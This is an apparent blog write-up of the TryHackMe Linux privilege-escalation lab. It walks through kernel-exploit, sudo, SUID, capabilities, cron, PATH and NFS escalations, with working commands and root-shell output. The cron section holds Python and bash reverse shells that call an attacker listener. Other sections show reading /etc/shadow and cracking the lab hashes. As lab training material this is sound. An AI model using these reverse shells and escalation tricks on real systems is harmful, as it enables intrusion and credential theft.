---
title: "TryHackMe: Linux Privilege Escalation Writeup"
date: 2025-08-08 12:11:00
categories: [TryHackMe, Jr Penetration Tester]
tag: [Privilege Escalation]
---


## Introduction

**Challenge Link:** 

[Linux Privilege Escalation](https://tryhackme.com/room/linprivesc)

- **Note:** This writeup includes external research and personal explanations.

**Linux privilege escalation** refers to the unauthorized act of gaining elevated permissions rather than legitimate, controlled privilege use. We will cover common privilege escalation techniques.

## Enumeration

Enumeration is the process of gathering information about your system to understand its structure, users, services, and potential vulnerabilities. Here are some basic enumeration commands:

1. **System Information**

```bash
uname -a                     # Kernel version and architecture
cat /etc/os-release          # OS version
hostnamectl                  # Detailed host information

```

1. **User & Group Info**

```bash
id                           # Current user info
whoami                       # Effective user ID
who                          # Logged-in users
w                            # Who is logged in and what they’re doing
groups                       # Groups of current user
cat /etc/passwd              # List all users
cat /etc/group               # List all groups

```

1. **Sudo & SUID Binaries**

```bash
sudo -l                      # Sudo rights (if passwordless or misconfigured)
find / -perm -4000 2>/dev/null     # All SUID binaries
find / -perm -2000 2>/dev/null     # All SGID binaries

```

1. **Files, Binaries, and Permissions**

```bash
ls -la /root/                # Root directory access
ls -la /home                 # User home directories
find / -type f -name "*_history" 2>/dev/null    # Shell history files
find / -writable -type d 2>/dev/null            # Writable directories

```

1. **Running Processes & Services**

```bash
ps aux                       # All running processes
ps -ef | grep root           # Processes running as root
netstat -tulnp               # Open ports and related services
ss -tulwn                    # Alternative to netstat

```

1. **Scheduled Jobs (Cron)**

```bash
crontab -l                  # User's cron jobs
ls -la /etc/cron*           # System-wide cron jobs
cat /etc/crontab

```

1. **Environment Variables**

```bash
env                         # Print environment variables
printenv
echo $PATH

```

1. **Interesting Files with Sensitive Info**

```bash
cat ~/.bash_history
cat ~/.ssh/id_rsa
cat ~/.ssh/authorized_keys
find / -name "*.conf" 2>/dev/null         # Config files
find / -name "*backup*" 2>/dev/null       # Backups
find / -name "*.log" 2>/dev/null          # Logs

```

1. **Capabilities**

```bash
getcap -r / 2>/dev/null

```

1. **Packages & Exploit Hints**

```bash
dpkg -l                        # Debian/Ubuntu installed packages
rpm -qa                        # RedHat/CentOS installed packages
lsmod                          # Kernel modules

```

1. **Automated Enumeration Tools**
- [linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
- [LinEnum](https://github.com/rebootuser/LinEnum)
- [linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
- [linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
- [linuxprivchecker](https://github.com/linted/linuxprivchecker)

## Privilege Escalation: Kernel Exploits

The Kernel exploit methodology is simple;

1. Identify the kernel version
2. Search and find an exploit code for the kernel version of the target system
3. Run the exploit
- Note that a failed kernel exploit can lead to a system crash

```bash
$ whoami
karen
$ id
uid=1001(karen) gid=1001(karen) groups=1001(karen)
$ uname -r
3.13.0-24-generic
$ cat /proc/version
Linux version 3.13.0-24-generic (buildd@panlong) (gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1) ) #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014

```

The Linux kernel version is **3.13.0-24-generic**, the vulnerability that can affect the kernel of the target system is -> [CVE-2015-1328](https://www.exploit-db.com/exploits/37292)

Download the exploitable onto your machine and compile it. When I first compiled it, it returned a missing header error, so I added these two headers to the code:

```c
#define _GNU_SOURCE     // Required for clone() and unshare()
#include <sys/wait.h>   // For wait(), waitpid()

```

```bash
─$ gcc -static ofs.c -o of
```

On the target machine, transfer the exploiter to `/tmp` folder so we can write our permission, then execute it.

```bash
$ cd /tmp
$ ls -l ofs
-rw-rw-r-- 1 karen karen 780000 Jul 16 15:03 ofs
$ chmod +x ofs
$ ./ofs
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),1001(karen)

```

## Privilege Escalation: Sudo

Sudo is a command-line tool that gives regular users root privileges or permissions. It also allows a user to perform actions with the privileges of another user. **View the sudoers file**

```bash
$ sudo -l
Matching Defaults entries for karen on ip-10-10-200-124:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin

User karen may run the following commands on ip-10-10-200-124:
    (ALL) NOPASSWD: /usr/bin/find
    (ALL) NOPASSWD: /usr/bin/less
    (ALL) NOPASSWD: /usr/bin/nano

```

`env_reset`: This means that when you run sudo, your environment variables (like `PATH`, `LD_PRELOAD`, `HOME`, etc.) are reset to a default minimal safe set. This is a security feature to prevent attackers from:

- injecting malicious environment variables (like `LD_PRELOAD`, `LD_LIBRARY_PATH`, `PYTHONPATH`, etc.)
- affecting the behavior of sudo-executed commands

`mail_badpass`This tells sudo to send an email to the system administrator if a user enters an incorrect password when trying to run sudo. But the command `find`, `less`, and `nano` won't trigger this rule because the user can use it without a password, thus we can exploit it to gain privilege escalation. This repo will help you with how to do the exploitation: [gtfobins.github.io](https://gtfobins.github.io/)

Abusing `find` command:

```bash
$ sudo find / -exec /bin/bash -c 'sudo LD_PRELOAD=/tmp/shell.so /usr/bin/find' \\;
root@ip-10-10-103-70:/# whoami
root
```

**Leverage LD_PRELOAD:** If this option `env_keep` is set in the sudoers, it will tell sudo which specific environment variables to preserve instead of resetting them.

Suppose this option is set with: `env_keep += "LD_PRELOAD"`, `LD_PRELOAD` is an environment variable that tells the dynamic linker (the part of Linux that loads shared libraries when a program starts) to load your specified shared library before any others, even before system libraries like `libc.so`. In short, it lets you inject your own code into a program before it runs. This [blog post](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/) will give you an idea about the capabilities of LD_PRELOAD.

The steps of this privilege escalation vector can be summarized as follows;

1. Check for LD_PRELOAD (with the `env_keep`option)
2. Write a simple C code compiled as a shared object (`.so` extension) file
3. Run the program with sudo rights and the `LD_PRELOAD` option pointing to our `.so` file

First, write a simple C code that will spawn a root shell, then compile it using `gcc` into a shared object file.

```bash
─$ cat shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}

─$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
─$ ls
shell.c  shell.so
─$ file shell.so
shell.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=d7387b7c4c9aaa4d9c5f6c574e4cdb1596fa09af, not stripped

```

Now we can use this shared object file when launching any program that our user can run with `sudo`. In our case, the user can use these commands: `find`, `less`, and `nano`.

```bash
─$ sudo LD_PRELOAD=/home/user/ldpreload/shell.so find

```

We can't run this exploit on the target machine since the option `env_keep` is not set.

## Privilege Escalation: SUID

If you want to allow regular users to execute privileged actions, you can use the "Set owner User ID upon execution" (SUID) permission on the executable file. This action allows any user to execute the file with root privileges. However, some SUID programs execute as non-root users

Use this command to list files that have SUID or SGID bits set.

```bash
$ find / -type f -perm -04000 -ls 2>/dev/null
-rwsr-xr-x   1 root     root               43352 Sep  5  2019 /usr/bin/base64

```

We can use [base64 SUID abuse](https://gtfobins.github.io/gtfobins/base64/#suid) to allow us to read files

```bash
LFILE=/home/ubuntu/flag3.txt
$ cd /usr/bin
$ ./base64 "$LFILE" | base64 --decode
THM-3847834

```

Change the LFILE variable to whatever file you wish to read.

```bash
LFILE=/etc/shadow
$ ./base64 "$LFILE" | base64 --decode

```

View both the `etc/shadow` and `etc/passwd`, then crack the user's password using the `unshadow` tool.

```bash
─$ unshadow passwd.txt shadow.txt > hash.txt
─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
─$ john --show hash.txt
gerryconway:test123:1001:1001::/home/gerryconway:/bin/sh
user2:Password1:1002:1002::/home/user2:/bin/sh
karen:Password1:1003:1003::/home/karen:/bin/sh

3 password hashes cracked, 0 left
```

## Privilege Escalation: Capabilities

**What Are Linux Capabilities?**: In traditional Unix systems, processes run as either:

- Root (full privileges)
- Non-root (limited privileges)

Linux capabilities break up the full set of root privileges into smaller, fine-grained privileges that can be independently assigned to processes or binaries. This allows a non-root process to perform certain actions usually reserved for root. **For example**:

- `CAP_NET_RAW`: Allows use of raw sockets.
- `CAP_SYS_ADMIN`: Very powerful, close to full root access.
- `CAP_SETUID`: Allows changing user IDs.
- Note: While this task does not require running the exploit to get the flag, I’ll demonstrate how to exploit binaries with set capabilities for educational purposes.

Use `getcap` tool to list enabled capabilities.

```bash
$ getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/home/karen/vim = cap_setuid+ep
/home/ubuntu/view = cap_setuid+ep
$ id
uid=1001(karen) gid=1001(karen) groups=1001(karen)

```

Both `vim`and `view`have the capability `cap_setuid+ep`, which means that when you run the binary, it can change its UID. I’ll test Vim and view capabilities. Change to the binary location directory and run the exploit.

[Vim Capability abuse](https://gtfobins.github.io/gtfobins/vim/#capabilities): First, we need to identify the Python version running on the target machine. *Prepend `:py3` for Python 3.*

```bash
$ python3 --version
Python 3.8.5
$ ./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
Erase is control-H (^H).
# id
uid=0(root) gid=1001(karen) groups=1001(karen)

```

The command used Vim to run Python code to escalate privileges with setuid(0) -> root, then launch a root shell with `os.execl`

[view Capability abuse](https://gtfobins.github.io/gtfobins/view/#capabilities)

```bash
$ ./view -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
Erase is control-H (^H).
# id
uid=0(root) gid=1001(karen) groups=1001(karen)
#
```

## Privilege Escalation: Cron Jobs

Cron is a time-based job scheduler in Unix/Linux. It executes scripts or commands automatically at scheduled intervals (every minute, hourly, daily, etc.). We can exploit badly configured cron jobs to get root privileges. Look for:

- Scripts or binaries in cron jobs owned by the root user are writable.
- If the cron file is writable.
- If cron.d directory is writable.

```bash
$ cat /etc/crontab
# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * *  root /antivirus.sh
* * * * *  root antivirus.sh
* * * * *  root /home/karen/backup.sh
* * * * *  root /tmp/test.py

```

The asterisks mean that the scripts will run every minute of every hour of every day of every month, regardless of the day of the week. I'm going to test both `test.py` and `backup.sh` scripts for a reverse shell.

Starting with `test.py`.

```bash
ls -al /tmp
total 44
drwxrwxrwt 11 root root 4096 Jul 15 10:51 .
drwxr-xr-x 19 root root 4096 Jul 15 10:48 ..
drwxrwxrwt  2 root root 4096 Jul 15 10:47 .ICE-unix

```

It looks like the `test.py` has been deleted, recreate it in the `tmp` folder and make sure to add the execution permission to both of the scripts.

Referred to ->  [Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

```python
#!/usr/bin/python3

import socket
import subprocess
import os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.9.8.180",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])

```

On the attacker machine, start the listener

```bash
nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.9.8.180] from (UNKNOWN) [10.10.237.210] 51296
/bin/sh: 0: can't access tty; job control turned off
# whoami
root

```

Done! We have successfully gained a shell from the `test.py` scheduled task.

Now, for the `backup.sh` file, change it to this.

```bash
#!/bin/bash

bash -i >& /dev/tcp/10.9.8.180/8080 0>&1

```

Start the listener:

```bash
nc -lnvp 8080
root@ip-10-10-237-210:~# id
uid=0(root) gid=0(root) groups=0(root)
root@ip-10-10-237-210:~# find / -name flag5.txt 2>/dev/null
/home/ubuntu/flag5.txt

```

## Privilege Escalation: PATH

`PATH` is an environment variable that stores a list of directories. When you run a command like `ls` or `python`, Linux searches through the directories listed in `PATH` to find the executable for that command.

**What happens if a folder you can write to is in the PATH?** If there is a folder in **$PATH** (e.g. `/tmp` or `.`) that you can write to, then:

- You can create a fake version of any command (like `ls`, or `cat`) in that writable folder.
- If a privileged user (like root) or a SUID binary relies on a command without specifying a full path, your fake script might get executed instead of the real one.

This depends entirely on the existing configuration of the target system, so be sure you can answer the questions below before trying this.

1. What folders are located under $PATH?

```bash
echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

```

1. Does your current user have write privileges for any of these folders?

For each directory, check write permissions by using:  `ls -ld <directory>`. Look for the write permission indicator (`w`) in the output for 'others' or 'group' permissions.

```bash
$ ls -ld /usr/local/sbin /usr/local/bin /usr/sbin /usr/bin /sbin /bin /usr/games /usr/local/games /snap/bin
lrwxrwxrwx 1 root root     7 Oct 26  2020 /bin -> usr/bin
lrwxrwxrwx 1 root root     8 Oct 26  2020 /sbin -> usr/sbin
drwxr-xr-x 2 root root  4096 Oct 22  2021 /snap/bin
drwxr-xr-x 2 root root 28672 Oct 26  2020 /usr/bin
drwxr-xr-x 2 root root  4096 Apr 15  2020 /usr/games
drwxr-xr-x 2 root root  4096 Oct 26  2020 /usr/local/bin
drwxr-xr-x 2 root root  4096 Oct 26  2020 /usr/local/games
drwxr-xr-x 2 root root  4096 Oct 26  2020 /usr/local/sbin
drwxr-xr-x 2 root root 12288 Oct 26  2020 /usr/sbin

```

1. Can you modify $PATH?

There is no writable folder. If we can modify it, then we need to add a writable folder to the `$PATH`, such as `/tmp` folder.

```bash
$ export PATH=/tmp:$PATH
$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
$ ls -ld /tmp
drwxrwxrwt 11 root root 4096 Jul 15 12:52 /tmp

```

1. Is there a script/application you can start that will be affected by this vulnerability?

We will create a script named `test.c` that will try to launch a system binary called `exploiter`.

```c
#include<unistd.h>
#include <stdlib.h>
void main()
{ setuid(0);
  setgid(0);
  system("exploiter");
}

```

Compile it into an executable and set the SUID bit.

```bash
$ gcc  test.c -o test -w
$ chmod u+s test
$ ls -l test
-rwSrw-r--  1 karen karen 16056 Jul 15 13:35 test

```

Once executed, `test` will look for an executable named `exploiter` inside folders listed under `PATH`. As the SUID bit is set, this binary will run with root privileges. 

Now, let's create the system binary that will be executed by the `test` binary in the `/tmp` folder.

```bash
$ echo "/bin/bash" > exploiter
$ chmod 777 exploiter
$ ls -l exploiter
-rwxrwxrwx 1 karen karen 10 Jul 15 13:45 exploiter

```

Run the binary

```bash
$ ./test
root@ip-10-10-224-225:/home/murdoch# whoami
root

```

We have given executable rights to our copy of `/bin/bash`. **Please note** that at this point it will run with our user’s rights. **What makes a privilege escalation possible within this context is that the path script runs with root privileges.**

## Privilege Escalation: NFS

This vector depends on a misconfigured network shell like NSF. The file `/etc/exports`, tells the NFS server which directories are being shared and how they're being shared.

```bash
$ cat /etc/exports
# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/home/backup *(rw,sync,insecure,no_root_squash,no_subtree_check)
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
/home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_check)

```

These files are being exported to all hosts (*) over the network, with the following dangerous options:

- `rw` -> Clients can read and write.
- `sync` -> Data is written to disk before the write is confirmed.
- `insecure` -> Allow connections from non-privileged ports (<1024).
- `no_root_squash` -> It means that if a remote user connects as root, they stay root.
- `no_subtree_check` -> Prevents subtree checking (used for performance).

By default, NFS downgrades the root user from a remote client to the nobody user when accessing files (this is called root squashing). This prevents a remote root user from writing to sensitive files on the NFS server. But with `no_root_squash`, that restriction is disabled — the remote root stays root on the shared directory. 

**That means:** If you can mount this **NFS share** and act as root on your system, you can create files owned by root or even upload a root-owned SSH key, giving you root shell access on the server.

First, enumerate mountable shares from our machine.

```bash
─$ showmount -e 10.10.129.69
Export list for 10.10.129.69:
/home/ubuntu/sharedfolder *
/tmp                      *
/home/backup              *

```

Then, mount one of the `no_root_squash` shares on our machine and start building the executable. Write these commands as a root user:

```bash
mkdir tmp-on-attacker-machine
mount -o rw 10.10.129.69:/tmp /tmp/tmp-on-attacker-machine
```

Create an executable that will run `/bin/bash` on the target system.

**test.c** file:

```c
#include<unistd.h>
#include <stdlib.h>
int main()
{ setuid(0);
  setgid(0);
  system("/bin/bash");
  return 0;
}
```

Compile the **test.c** file and set the SUID bits permission.

```bash
─$ sudo su
─# nano test.c
─# gcc -static test.c -o nfs -w
─# ls -l
total 20
-rwxr-xr-x 1 root root 16056 Jul 16 04:49 nfs
-rw-r--r-- 1 root root   113 Jul 16 04:48 test.c
─# chmod +s nfs
─# ls -l
-rwsr-sr-x 1 root root 16056 Jul 16 04:55 nfs

```

On the target machine:

```bash
$ cd /tmp
$ ls -l
-rwsr-sr-x 1 root root 16056 Jul 16 08:55 nfs
$ id
uid=1001(karen) gid=1001(karen) groups=1001(karen)
$ ./nfs
root@ip-10-10-129-69:/tmp# id
uid=0(root) gid=0(root) groups=0(root),1001(karen)

```

## Capstone Challenge

This task is to test your privilege escalation skill. You have been given SSH access to the Leonard machine. The task is to search for a privilege escalation vector.

Start with the enumeration process

```bash
[leonard@ip-10-10-232-53 ~]$ id
uid=1000(leonard) gid=1000(leonard) groups=1000(leonard) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

```

Check the sudoer file

```bash
[leonard@ip-10-10-232-53 ~]$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility
[sudo] password for leonard:
Sorry, user leonard may not run sudo on ip-10-10-232-53.

```

Check kernel version

```bash
[leonard@ip-10-10-232-53 ~]$ cat /proc/version
Linux version 3.10.0-1160.el7.x86_64 (mockbuild@kbuilder.bsys.centos.org) (gcc version 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC) ) #1 SMP Mon Oct 19 16:18:59 UTC 2020

```

He is running Linux kernel version 3.10.0-1160, which is used by CentOS 7. The kernel was compiled with GCC 4.8.5.

Checking SUID

```bash
[leonard@ip-10-10-232-53 ~]$ find / -type f -perm -04000 -ls 2>/dev/null
16779966   40 -rwsr-xr-x   1 root     root        37360 Aug 20  2019 /usr/bin/base64
17298702   60 -rwsr-xr-x   1 root     root        61320 Sep 30  2020 /usr/bin/ksu
17261777   32 -rwsr-xr-x   1 root     root        32096 Oct 30  2018 /usr/bin/fusermount
17512336   28 -rwsr-xr-x   1 root     root        27856 Apr  1  2020 /usr/bin/passwd
17698538   80 -rwsr-xr-x   1 root     root        78408 Aug  9  2019 /usr/bin/gpasswd
17698537   76 -rwsr-xr-x   1 root     root        73888 Aug  9  2019 /usr/bin/chage
17698541   44 -rwsr-xr-x   1 root     root        41936 Aug  9  2019 /usr/bin/newgrp
17702679  208 ---s--x---   1 root     stapusr    212080 Oct 13  2020 /usr/bin/staprun
17743302   24 -rws--x--x   1 root     root        23968 Sep 30  2020 /usr/bin/chfn
17743352   32 -rwsr-xr-x   1 root     root        32128 Sep 30  2020 /usr/bin/su
17743305   24 -rws--x--x   1 root     root        23880 Sep 30  2020 /usr/bin/chsh
17831141 2392 -rwsr-xr-x   1 root     root      2447304 Apr  1  2020 /usr/bin/Xorg
17743338   44 -rwsr-xr-x   1 root     root        44264 Sep 30  2020 /usr/bin/mount
17743356   32 -rwsr-xr-x   1 root     root        31984 Sep 30  2020 /usr/bin/umount
17812176   60 -rwsr-xr-x   1 root     root        57656 Aug  9  2019 /usr/bin/crontab
17787689   24 -rwsr-xr-x   1 root     root        23576 Apr  1  2020 /usr/bin/pkexec
18382172   52 -rwsr-xr-x   1 root     root        53048 Oct 30  2018 /usr/bin/at
20386935  144 ---s--x--x   1 root     root       147336 Sep 30  2020 /usr/bin/sudo
34469385   12 -rwsr-xr-x   1 root     root        11232 Apr  1  2020 /usr/sbin/pam_timestamp_check
34469387   36 -rwsr-xr-x   1 root     root        36272 Apr  1  2020 /usr/sbin/unix_chkpwd
36070283   12 -rwsr-xr-x   1 root     root        11296 Oct 13  2020 /usr/sbin/usernetctl
35710927   40 -rws--x--x   1 root     root        40328 Aug  9  2019 /usr/sbin/userhelper
38394204  116 -rwsr-xr-x   1 root     root       117432 Sep 30  2020 /usr/sbin/mount.nfs
958368   16 -rwsr-xr-x   1 root     root        15432 Apr  1  2020 /usr/lib/polkit-1/polkit-agent-helper-1
37709347   12 -rwsr-xr-x   1 root     root        11128 Oct 13  2020 /usr/libexec/kde4/kpac_dhcp_helper
51455908   60 -rwsr-x---   1 root     dbus        57936 Sep 30  2020 /usr/libexec/dbus-1/dbus-daemon-launch-helper
17836404   16 -rwsr-xr-x   1 root     root        15448 Apr  1  2020 /usr/libexec/spice-gtk-x86_64/spice-client-glib-usb-acl-helper
18393221   16 -rwsr-xr-x   1 root     root        15360 Oct  1  2020 /usr/libexec/qemu-bridge-helper
37203442  156 -rwsr-x---   1 root     sssd       157872 Oct 15  2020 /usr/libexec/sssd/krb5_child
37203771   84 -rwsr-x---   1 root     sssd        82448 Oct 15  2020 /usr/libexec/sssd/ldap_child
37209171   52 -rwsr-x---   1 root     sssd        49592 Oct 15  2020 /usr/libexec/sssd/selinux_child
37209165   28 -rwsr-x---   1 root     sssd        27792 Oct 15  2020 /usr/libexec/sssd/proxy_child
18270608   16 -rwsr-sr-x   1 abrt     abrt        15344 Oct  1  2020 /usr/libexec/abrt-action-install-debuginfo-to-abrt-cache
18535928   56 -rwsr-xr-x   1 root     root        53776 Mar 18  2020 /usr/libexec/flatpak-bwrap

```

We can abuse base64 binary to read files like `/etc/shadow`

```bash
[leonard@ip-10-10-232-53 ~]$ LFILE=/etc/shadow
[leonard@ip-10-10-232-53 ~]$ /usr/bin/base64 "$LFILE" | base64 --decode
root:$6$DWBzMoiprTTJ4gbW$g0szmtfn3HYFQweUPpSUCgHXZLzVii5o6PM0Q2oMmaDD9oGUSxe1yvKbnYsaSYHrUEQXTjIwOW/yrzV5HtIL51::0:99999:7:::
leonard:$6$JELumeiiJFPMFj3X$OXKY.N8LDHHTtF5Q/pTCsWbZtO6SfAzEQ6UkeFJy.Kx5C9rXFuPr.8n3v7TbZEttkGKCVj50KavJNAm7ZjRi4/::0:99999:7:::
missy:$6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/:18785:0:99999:7:::
[leonard@ip-10-10-232-53 ~]$
[leonard@ip-10-10-232-53 ~]$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
leonard:x:1000:1000:leonard:/home/leonard:/bin/bash
missy:x:1001:1001::/home/missy:/bin/bash
[leonard@ip-10-10-232-53 ~]$

```

Now, crack the passwords, copy both `/passwd` and `/shadow` files, and save them.

```bash
─$ unshadow passwd.txt shadow.txt > hash.txt
─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
─$ john --show hash.txt
leonard:Penny123:1000:1000:leonard:/home/leonard:/bin/bash
missy:Password1:1001:1001::/home/missy:/bin/bash

2 password hashes cracked, 0 left

```

Switch to the Missy account, and check for misconfigurations that could lead to privilege escalation.

```bash
[missy@ip-10-10-181-178 leonard]$ sudo -l
Matching Defaults entries for missy on ip-10-10-181-178:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS
    DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS
    LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY
    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY", secure_path=/sbin\\:/bin\\:/usr/sbin\\:/usr/bin

User missy may run the following commands on ip-10-10-181-178:
    (ALL) NOPASSWD: /usr/bin/find

```

The user Missy can run `find` With the sudo command, we can abuse this to escalate 

```bash
[missy@ip-10-10-181-178 leonard]$ sudo find . -exec /bin/sh \\; -quit
sh-4.2# whoami
root
sh-4.2# find / -name flag*.txt
/home/missy/Documents/flag1.txt
/home/rootflag/flag2.txt

```

## References:

- [ExploitingBadlyConfiguredCronJobs](https://payatu.com/blog/a-guide-to-linux-privilege-escalation/#5_Exploiting_Badly_Configured_Cron_Jobs*)
- [cybersecurity-101-privilege-escalation](https://www.crowdstrike.com/en-us/cybersecurity-101/cyberattacks/privilege-escalation/*)
- [strongdm-linux-privilege-escalation](https://www.strongdm.com/blog/linux-privilege-escalation*)
